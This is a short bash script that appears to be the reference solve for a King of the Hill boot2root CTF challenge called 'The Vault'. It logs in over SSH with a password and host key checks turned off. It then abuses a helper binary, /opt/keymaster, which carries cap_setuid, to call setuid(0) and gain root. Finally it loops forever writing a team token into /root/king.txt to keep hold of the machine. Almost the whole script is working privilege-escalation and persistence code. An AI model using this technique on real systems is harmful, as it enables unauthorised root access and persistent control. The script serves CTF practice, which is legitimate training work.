#!/usr/bin/env bash
# Reference holder for The Vault (boot2root KotH). Needs `sshpass`.
#   ./solve.sh HOST PORT <team_token> [password]
# Privesc: /opt/keymaster carries cap_setuid. Then hold at ROOT level.
set -euo pipefail
HOST="${1:?usage: solve.sh HOST PORT <team_token> [password]}"; PORT="${2:?port}"
TOKEN="${3:?team token (CTFd King of the Hill page)}"; PW="${4:-player}"
sshpass -p "$PW" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  -p "$PORT" "player@$HOST" \
  "/opt/keymaster -c 'import os,time; os.setuid(0); print(\"[+] root=%d\"%os.getuid())
while True:
    open(\"/root/king.txt\",\"w\").write(\"$TOKEN\"); time.sleep(15)'"
